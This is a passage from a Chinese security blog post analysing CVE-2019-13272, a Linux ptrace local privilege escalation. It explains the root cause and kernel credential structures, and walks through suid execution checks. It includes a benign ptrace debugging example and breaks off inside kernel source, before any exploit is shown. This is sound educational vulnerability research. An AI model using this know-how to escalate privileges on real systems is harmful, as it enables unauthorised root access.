    <title>【CVE.0x05】CVE-2019-13272 ptrace 漏洞复现及简要分析</title>
    <link href="http://blog.arttnba3.cn/2022/01/17/CVE-0X05-CVE-2019-13272/"/>
    <id>http://blog.arttnba3.cn/2022/01/17/CVE-0X05-CVE-2019-13272/</id>
    <published>2022-01-16T17:49:56.000Z</published>
    <updated>2022-01-16T17:54:33.000Z</updated>
    
    <content type="html"><![CDATA[<p>你不许说他，他是你爹？</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p>CVE-2019-13272 是自 Linux v4.11 版本起引入的一个本地提权漏洞，由来自 Google Zero Project 安全团队的  Jann Horn （<del>很帅气的外国小哥</del>）于 2019 年 9 月发现，该漏洞的成因主要是 ptrace 系统调用中 <code>PTRACE_TRACEME</code> 参数调用路径上的 <code>ptrace_link()</code> 函数错误地处理了想要创建 ptrace 关系的进程间的凭据记录，从而导致攻击者可以通过 suid 程序实现本地提权</p><p>该漏洞影响版本从 <code>v4.11</code> 到 <code>v5.1.17</code>，不过<strong>只能在有着桌面环境的情况下完成提权</strong>，因为提权需要用到一个通常只在桌面环境下存在的 <em>helper程序</em> ，所以相对比较鸡肋</p><p>在分析该漏洞之前，我们先补充一些前置知识</p><blockquote><p>以下内核源码皆来自于 Linux v4.11</p></blockquote><h2 id="ptrace-系统调用"><a href="#ptrace-系统调用" class="headerlink" title="ptrace 系统调用"></a>ptrace 系统调用</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="title function_">ptrace</span><span class="params">(<span class="keyword">enum</span> __ptrace_request request, <span class="type">pid_t</span> pid,</span></span><br><span class="line"><span class="params">                   <span class="type">void</span> *addr, <span class="type">void</span> *data)</span>;</span><br></pre></td></tr></table></figure><p>ptrace 系统调用主要用于对进程进行调试：该系统调用提供了一种机制使得调试进程（ptracer）可以观察与控制被调试进程（ptracee）的执行过程，并修改被调试进程的寄存器及内存，从而操控被调试进程实现特定的行为</p><blockquote><p> 相信大家对这个系统调用应该都不陌生，gdb 调试便是利用了这个系统调用</p></blockquote><p>常见的建立 ptrace 连接有两种方法：</p><ul><li>子进程通过 <code>PTRACE_TRACEME</code> 请求父进程进行调试</li><li>父进程通过 <code>PTRACE_ATTACH</code> 主动对指定进程进行调试</li></ul><p>这个漏洞主要是出现在第一条路径中，因此我们下文主要针对第一条路径进行分析</p><p>一个典型的通过 ptrace 由父进程对子进程进行单步调试的例子如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> wait_val;</span><br><span class="line">    <span class="type">int</span> instructions = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> child_pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (!child_pid) <span class="comment">// child</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] Set the child as a ptracee.&quot;</span>);</span><br><span class="line">        ptrace(PTRACE_TRACEME, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>); <span class="comment">// let the parent ptrace it, won&#x27;t stop there but send a signal to parent</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] Done. Now waiting for the parent...&quot;</span>);</span><br><span class="line">        execl(<span class="string">&quot;./helloworld&quot;</span>, <span class="string">&quot;helloworld&quot;</span>, <span class="literal">NULL</span>); <span class="comment">// the programme to be debug</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="comment">// parent</span></span><br><span class="line">    &#123;</span><br><span class="line">        wait(&amp;wait_val); <span class="comment">// waiting for the signal from child</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] Parent received signal, running...&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span> (wait_val == <span class="number">1407</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            instructions++;</span><br><span class="line">            <span class="keyword">if</span> (ptrace(PTRACE_SINGLESTEP, child_pid, <span class="number">0</span>, <span class="number">0</span>) != <span class="number">0</span>)</span><br><span class="line">                perror(<span class="string">&quot;ptrace error!&quot;</span>);</span><br><span class="line">            </span><br><span class="line">            wait(&amp;wait_val);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] Done for %d instructions.\n&quot;</span>, instructions);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] Parent quit.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><p><img src="https://s2.loli.net/2022/01/13/ZodQuBfgsrLCXlp.png" alt="image.png"></p><p>通常情况下，ptrace <strong>只能调试属于 ptracer 所属用户的进程</strong>，例如普通用户便不能调试 root 进程</p><h2 id="task-struct：进程描述符（process-descriptor）"><a href="#task-struct：进程描述符（process-descriptor）" class="headerlink" title="task_struct：进程描述符（process descriptor）"></a>task_struct：进程描述符（process descriptor）</h2><p>在 Linux 中一个进程便是一个 task，在 kernel 中使用一个 <code>task_struct</code> 结构体进行标识，该结构体定义于内核源码<code>include/linux/sched.h</code>中</p><p>我们主要关心其对于进程权限的管理，注意到<code>task_struct</code>的源码中有如下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Process credentials: */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Tracer&#x27;s credentials at attach: */</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>*<span class="title">ptracer_cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Objective and real subjective task credentials (COW): */</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>*<span class="title">real_cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Effective (overridable) subjective task credentials (COW): */</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>*<span class="title">cred</span>;</span></span><br></pre></td></tr></table></figure><p><strong>Process credentials</strong> 是 kernel 用以判断一个进程权限的凭证，在 kernel 中使用 <code>cred</code> 结构体进行标识，对于一个进程而言应当有三个 cred：</p><ul><li><strong>ptracer_cred：</strong>使用<code>ptrace</code>系统调用跟踪该进程的调试进程（ptracer）的 cred</li><li><strong>real_cred：</strong>即<strong>客体凭证</strong>（<strong>objective cred</strong>），通常是一个进程最初启动时所具有的权限</li><li><strong>cred：</strong>即<strong>主体凭证</strong>（<strong>subjective cred</strong>），该进程的有效cred，kernel以此作为进程权限的凭证</li></ul><h2 id="cred：进程权限凭证（credentials）"><a href="#cred：进程权限凭证（credentials）" class="headerlink" title="cred：进程权限凭证（credentials）"></a>cred：进程权限凭证（credentials）</h2><p>对于一个进程，在内核当中使用一个结构体<code>cred</code>管理其权限，该结构体定义于内核源码<code>include/linux/cred.h</code>中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line"><span class="type">atomic_t</span>usage;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line"><span class="type">atomic_t</span>subscribers;<span class="comment">/* number of processes subscribed */</span></span><br><span class="line"><span class="type">void</span>*put_addr;</span><br><span class="line"><span class="type">unsigned</span>magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">kuid_t</span>uid;<span class="comment">/* real UID of the task */</span></span><br><span class="line"><span class="type">kgid_t</span>gid;<span class="comment">/* real GID of the task */</span></span><br><span class="line"><span class="type">kuid_t</span>suid;<span class="comment">/* saved UID of the task */</span></span><br><span class="line"><span class="type">kgid_t</span>sgid;<span class="comment">/* saved GID of the task */</span></span><br><span class="line"><span class="type">kuid_t</span>euid;<span class="comment">/* effective UID of the task */</span></span><br><span class="line"><span class="type">kgid_t</span>egid;<span class="comment">/* effective GID of the task */</span></span><br><span class="line"><span class="type">kuid_t</span>fsuid;<span class="comment">/* UID for VFS ops */</span></span><br><span class="line"><span class="type">kgid_t</span>fsgid;<span class="comment">/* GID for VFS ops */</span></span><br><span class="line"><span class="type">unsigned</span>securebits;<span class="comment">/* SUID-less security management */</span></span><br><span class="line"><span class="type">kernel_cap_t</span>cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line"><span class="type">kernel_cap_t</span>cap_permitted;<span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line"><span class="type">kernel_cap_t</span>cap_effective;<span class="comment">/* caps we can actually use */</span></span><br><span class="line"><span class="type">kernel_cap_t</span>cap_bset;<span class="comment">/* capability bounding set */</span></span><br><span class="line"><span class="type">kernel_cap_t</span>cap_ambient;<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>jit_keyring;<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment"> * keys to */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"><span class="type">void</span>*security;<span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span><span class="comment">/* real user ID subscription */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span><span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line"><span class="comment">/* RCU deletion */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="type">int</span> non_rcu;<span class="comment">/* Can we skip RCU deletion? */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span><span class="title">rcu</span>;</span><span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125;;</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><p>我们主要关注<code>cred</code>结构体中管理权限的变量</p><h3 id="用户ID-amp-组ID"><a href="#用户ID-amp-组ID" class="headerlink" title="用户ID &amp; 组ID"></a>用户ID &amp; 组ID</h3><p>一个cred结构体中记载了<strong>一个进程四种不同的用户ID</strong>：</p><ul><li><strong>真实用户ID</strong>（real UID）：标识一个进程<strong>启动时的用户ID</strong></li><li><strong>保存用户ID</strong>（saved UID）：标识一个进程<strong>最初的有效用户ID</strong></li><li><strong>有效用户ID</strong>（effective UID）：标识一个进程<strong>正在运行时所属的用户ID</strong>，一个进程在运行途中是可以改变自己所属用户的，因而权限机制也是通过有效用户ID进行认证的，内核通过 euid 来进行特权判断；为了防止用户一直使用高权限，当任务完成之后，euid 会与 suid 进行交换，恢复进程的有效权限</li><li><strong>文件系统用户ID</strong>（UID for VFS ops）：标识一个进程<strong>创建文件时进行标识的用户ID</strong></li></ul><p>在通常情况下这几个ID应当都是相同的</p><p>用户组ID同样分为四个：<code>真实组ID</code>、<code>保存组ID</code>、<code>有效组ID</code>、<code>文件系统组ID</code>，与用户ID是类似的，这里便不再赘叙</p><h3 id="命名空间（namespace）"><a href="#命名空间（namespace）" class="headerlink" title="命名空间（namespace）"></a>命名空间（namespace）</h3><p>cred 结构体中的 user_ns  字段标识了该进程所属的命名空间</p><h2 id="namespace：命名空间"><a href="#namespace：命名空间" class="headerlink" title="namespace：命名空间"></a>namespace：命名空间</h2><p><strong>命名空间</strong>（<strong>namespace</strong>） <strong>是 Linux kernel 用来隔离内核资源的方式。</strong> 通过 namespace 可以让一些进程只能看到与自己相关的一部分资源，而另外一些进程也只能看到与它们自己相关的资源，双方都无法访问对方命名空间中的资源</p><p>在 cred 当中有指向其所属命名空间的指针，在Linux kernel 中命名空间为一个 <code>user_namespace</code> 结构体，该结构体定义于 <code>/include/linux/user_namespace.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">uid_gid_map</span><span class="title">uid_map</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">uid_gid_map</span><span class="title">gid_map</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">uid_gid_map</span><span class="title">projid_map</span>;</span></span><br><span class="line"><span class="type">atomic_t</span>count;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span>*<span class="title">parent</span>;</span></span><br><span class="line"><span class="type">int</span>level;</span><br><span class="line"><span class="type">kuid_t</span>owner;</span><br><span class="line"><span class="type">kgid_t</span>group;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ns_common</span><span class="title">ns</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>flags;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Register of per-UID persistent keyrings for this namespace */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_PERSISTENT_KEYRINGS</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">persistent_keyring_register</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span><span class="title">persistent_keyring_register_sem</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span><span class="title">work</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SYSCTL</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ctl_table_set</span><span class="title">set</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ctl_table_header</span> *<span class="title">sysctls</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ucounts</span>*<span class="title">ucounts</span>;</span></span><br><span class="line"><span class="type">int</span> ucount_max[UCOUNT_COUNTS];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我们主要关注这几个字段：</p><ul><li><strong>owner</strong>：即该命名空间的<strong>所有者</strong>；通常来说每个进程有其独立的命名空间，但对于一些需要共享资源的进程而言他们有可能会需要共享同一个命名空间</li><li><strong>group</strong>：命名空间所属的用户组</li><li><strong>parent</strong>：该命名空间的父命名空间，关系类似于父子进程，最上一层为 init_cred 的命名空间 <code>init_user_ns</code></li></ul><h2 id="linux-binprm：待执行文件数据"><a href="#linux-binprm：待执行文件数据" class="headerlink" title="linux_binprm：待执行文件数据"></a>linux_binprm：待执行文件数据</h2><p>前面讲到 ptrace 应当配合着 execve 进行使用，在 execve 系统调用中涉及到一个结构体叫做 <code>linux_binprm</code>，该结构体用以记录 kernel 加载（其实就是执行）一个二进制文件时用到的数据，定义于 <code>/include/linux/binfmts.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This structure is used to hold the arguments that are used when loading binaries.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">linux_binprm</span> &#123;</span></span><br><span class="line"><span class="type">char</span> buf[BINPRM_BUF_SIZE];</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MMU</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> vma_pages;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> MAX_ARG_PAGES32</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>[<span class="title">MAX_ARG_PAGES</span>];</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> p; <span class="comment">/* current top of mem */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span></span><br><span class="line">cred_prepared:<span class="number">1</span>,<span class="comment">/* true if creds already prepared (multiple</span></span><br><span class="line"><span class="comment"> * preps happen for interpreters) */</span></span><br><span class="line">cap_effective:<span class="number">1</span>;<span class="comment">/* true if has elevated effective capabilities,</span></span><br><span class="line"><span class="comment"> * false if not; except for init which inherits</span></span><br><span class="line"><span class="comment"> * its parent&#x27;s caps anyway */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __alpha__</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> taso:<span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> recursion_depth; <span class="comment">/* only for search_binary_handler() */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> * <span class="title">file</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">cred</span>;</span><span class="comment">/* new credentials */</span></span><br><span class="line"><span class="type">int</span> unsafe;<span class="comment">/* how unsafe this exec is (mask of LSM_UNSAFE_*) */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> per_clear;<span class="comment">/* bits to clear in current-&gt;personality */</span></span><br><span class="line"><span class="type">int</span> argc, envc;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> * filename;<span class="comment">/* Name of binary as seen by procps */</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> * interp;<span class="comment">/* Name of the binary really executed. Most</span></span><br><span class="line"><span class="comment">   of the time same as filename, but could be</span></span><br><span class="line"><span class="comment">   different for binfmt_&#123;misc,script&#125; */</span></span><br><span class="line"><span class="type">unsigned</span> interp_flags;</span><br><span class="line"><span class="type">unsigned</span> interp_data;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> loader, exec;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里我们主要关注 cred 字段，其标识了要运行的<strong>新程序的权限</strong></p><h2 id="LSM-与-程序执行权限检查"><a href="#LSM-与-程序执行权限检查" class="headerlink" title="LSM 与 程序执行权限检查"></a>LSM 与 程序执行权限检查</h2><p>在 task_struct 结构体当中我们注意到 <code>ptracer_cred</code> 这个字段，这个字段自 <code>Linux kernel 4.10</code>  引入到 task_struct 结构体当中，引入 ptracer_cred 的目的是用于当 tracee 执行 exec 去加载 <a href="https://www.computerhope.com/jargon/s/setuid.htm">setuid executable</a> 时做安全检测</p><blockquote><p>参见 <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=64b875f7ac8a5d60a4e191479299e931ee949b67">ptrace: Capture the ptracer’s creds not PT_PTRACE_CAP</a> </p></blockquote><p>这一部分会展开分析一定数量的内核源码，针对这个漏洞而言，可以直接看结论：<strong>若 ptracee 进程执行 suid&#x2F;sgid 程序，则检查 ptracee 保存的 ptracer 的 cred，即 ptracee 的 task_struct 的 ptracer_cred 字段的权限，若权限不足则 ptracee 以其自身的 euid&#x2F;egid 执行程序，而非文件的 suid&#x2F;sgid</strong></p><h3 id="suid-x2F-sgid-文件的执行流程"><a href="#suid-x2F-sgid-文件的执行流程" class="headerlink" title="suid&#x2F;sgid 文件的执行流程"></a>suid&#x2F;sgid 文件的执行流程</h3><p>当一个进程执行一个 suid 文件时（例如 <code>/usr/bin/passwd</code>），存在如下调用链：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SYS_execve()</span><br><span class="line">    do_execve()</span><br><span class="line">    do_execveat_common()</span><br><span class="line">    prepare_binprm()</span><br><span class="line">    bprm_fill_uid()</span><br></pre></td></tr></table></figure><p>函数 <code>bprm_fill_uid()</code> 定义于 <code>/fs/exec.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">bprm_fill_uid</span><span class="params">(<span class="keyword">struct</span> linux_binprm *bprm)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> mode;</span><br><span class="line"><span class="type">kuid_t</span> uid;</span><br><span class="line"><span class="type">kgid_t</span> gid;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Since this can be called multiple times (via prepare_binprm),</span></span><br><span class="line"><span class="comment"> * we must clear any previous work done when setting set[ug]id</span></span><br><span class="line"><span class="comment"> * bits from any earlier bprm-&gt;file uses (for example when run</span></span><br><span class="line"><span class="comment"> * first for a setuid script then again for its interpreter).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="comment">// 笔者注：首先使用原进程 euid egid</span></span><br><span class="line">bprm-&gt;cred-&gt;euid = current_euid();</span><br><span class="line">bprm-&gt;cred-&gt;egid = current_egid();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!mnt_may_suid(bprm-&gt;file-&gt;f_path.mnt))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (task_no_new_privs(current))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">inode = file_inode(bprm-&gt;file);</span><br><span class="line">mode = READ_ONCE(inode-&gt;i_mode);</span><br><span class="line"><span class="keyword">if</span> (!(mode &amp; (S_ISUID|S_ISGID)))</span><br><span class="line"><span class="keyword">return</span>; <span class="comment">// 笔者注：不是 suid/sgid 程序，直接返回，否则将 euid/egid 设为文件 uid/gid</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Be careful if suid/sgid is set */</span></span><br><span class="line">inode_lock(inode);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* reload atomically mode/uid/gid now that lock held */</span></span><br><span class="line">mode = inode-&gt;i_mode;</span><br><span class="line">uid = inode-&gt;i_uid;</span><br><span class="line">gid = inode-&gt;i_gid;</span><br><span class="line">inode_unlock(inode);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* We ignore suid/sgid if there are no mappings for them in the ns */</span></span><br><span class="line"><span class="keyword">if</span> (!kuid_has_mapping(bprm-&gt;cred-&gt;user_ns, uid) ||</span><br><span class="line"> !kgid_has_mapping(bprm-&gt;cred-&gt;user_ns, gid))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span 